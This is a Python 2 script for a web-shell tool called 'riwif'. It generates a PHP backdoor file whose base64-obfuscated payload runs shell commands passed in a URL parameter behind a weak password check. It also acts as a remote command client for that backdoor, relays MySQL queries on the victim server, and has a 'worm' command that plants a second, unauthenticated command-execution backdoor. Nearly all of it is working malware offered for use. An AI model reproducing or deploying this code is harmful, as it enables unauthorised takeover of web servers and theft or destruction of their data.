#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import urllib
import os
import ssl
import sys
import hashlib

BASE = ''
USERNAME = ''
PASSWORD = ''
HOST = ''
SHELL = 'JHNlc3Npb25fc3RhcnQgPSAwOw0KaWYoaXNzZXQoJF9HRVRbJ3UnXSkgJiYgaXNzZXQoJF9HRVRbJ3AnXSkpDQoJaWYoJF9HRVRbJ3UnXSA9PSAkdXNlciAmJiBtZDUoJF9HRVRbJ3AnXSkgPT0gJHBhc3MpDQoJCSRzZXNzaW9uX3N0YXJ0ID0gMTsNCgllbHNlDQoJCWVjaG8gJ0JhZCBsb2dpbic7DQppZigkc2Vzc2lvbl9zdGFydCA9PSAxICYmIGlzc2V0KCRfR0VUWydjbWQnXSkpDQoJaWYoJF9HRVRbJ2NtZCddID09ICdob3N0JykgZWNobyAkX1NFUlZFUlsnSFRUUF9IT1NUJ10uJzonLmdldGN3ZCgpOw0KCWVsc2UgZWNobyhzaGVsbF9leGVjKCRfR0VUWydjbWQnXS4iICYiKSk7'
SHELL_NAME = ''

def worm():
	code_worm = 'aWYoIWVtcHR5KCRfR0VUWydyaXdpZiddKSkgDQoJZWNobyBzaGVsbF9leGVjKCRfR0VUWydyaXdpZiddKTs=';
	url_worm = HOST + '?u=' + USERNAME + '&p=' + PASSWORD + '&cmd=worm&code=' + code_worm
	urlsend = urllib.urlopen(url_worm)
	html = urlsend.read()
	if html <> '':
		print "Worm ok on " + html +  '?riwif=ls'
	else:
		print 'No uploaded'

def connexion(user,password):
	global HOST
	global USERNAME
	global PASSWORD
	global SHELL_NAME
	for i, value in enumerate(sys.argv):
		if value == '-u':
			USERNAME = sys.argv[i+1]
		if value == '-p':
			PASSWORD = sys.argv[i+1]
		if value == '-h':
			HOST = sys.argv[i+1]
		if value == '--generate':
			SHELL_NAME = sys.argv[i+1]
	if SHELL_NAME <> '':
		create()
	else:
		url = urllib.urlopen(HOST + '?u=' + USERNAME + '&p=' + PASSWORD)
		if url.read() <> 'Bad login':
			base()
			while 1:
				command()
			pass
		else:
			print 'Error'
			sys.exit()

def base():
	global BASE
	global HOST
	global USERNAME
	global PASSWORD

	check_base = HOST + '?u=' + USERNAME + '&p=' + PASSWORD + '&cmd=host'
	url_check = urllib.urlopen(check_base)
	BASE = url_check.read()

def command():
	user_mysql = ''
	pass_mysql = ''
	host_mysql = ''
	bdd_mysql  = ''

	ask = raw_input(BASE + ':~# ')
	if ask == 'worm':
		worm()
	if ask == 'clear':
		os.system('clear')
	if ask == 'quit':
		sys.exit()
	if ask == 'mysql':
		if user_mysql == '' and pass_mysql == '' and host_mysql == '' and bdd_mysql == '':
			host_mysql = raw_input('host mysql ? > ')
			user_mysql = raw_input('user mysql ? > ')
			pass_mysql = raw_input('pass mysql ? > ')
			bdd_mysql = raw_input('bdd mysql ? > ')
		check_cmd = HOST + '?u=' + USERNAME + '&p=' + PASSWORD + '&cmd=' + ask + '&uw=' + user_mysql + '&pw=' + pass_mysql + '&hw=' + host_mysql + '&bw=' + bdd_mysql
		url = urllib.urlopen(check_cmd)
		if url.read() == 'connected':
			print 'Connected to ' + HOST + ' Mysql !'
			while 1:
				mysql = raw_input('mysql > ');
				if mysql == 'exit':
					break
				else:
					query = HOST + '?u=' + USERNAME + '&p=' + PASSWORD + '&cmd=' + ask + '&q=' + mysql + '&uw=' + user_mysql + '&pw=' + pass_mysql + '&hw=' + host_mysql + '&bw=' + bdd_mysql
					url = urllib.urlopen(query)
					print url.read()
			pass
		else:
			print 'error connect mysql'
	else:
		check_cmd = HOST + '?u=' + USERNAME + '&p=' + PASSWORD + '&cmd=' + ask
		url = urllib.urlopen(check_cmd)
		print url.read()

def help():
	print """ 
WWW++W++WWWWW  
WWW++++++WWWW  
WW++++++++#WW  
W****WW****WW  
****#**W****W  
W****WW****WW  
WW********WWW  
WWW#*****WWWW  
WWWWWWWWWWWWW  
WWWWWWWWWWWWW 
"""
	print "[~] Generate shell   : " + sys.argv[0] + " --generate [filename.php] -u [user] -p [pass]"
	print "[~] Connect to shell : " + sys.argv[0] + " -u [user] -p [pass] -h http://site.com/riwif.php"
	print "[~] Connect to MySQLi : " + sys.argv[0] + "after connect use -> mysqli"
	print "[~] Exit riwif shell : use -> quit"

def main():
	if len(sys.argv) < 3:
		help()
		sys.exit()
	if len(sys.argv) > 3:
		connexion('root','toor')
	else:
		print help()

def create():
	global SHELL
	global SHELL_NAME
	global USERNAME
	global PASSWORD

	md5encode = hashlib.md5()
	md5encode.update(PASSWORD)
	PASSWORD = md5encode.hexdigest()

	file_name = open(SHELL_NAME, 'w')
	file_name.write('<?php $user = "' + USERNAME + '"; $pass = "' + PASSWORD + '"; $shell = base64_decode("' + SHELL + '"); echo eval($shell); ?>')
	file_name.close()

if __name__ == "__main__":
    try:
        main()
    finally:
       print ""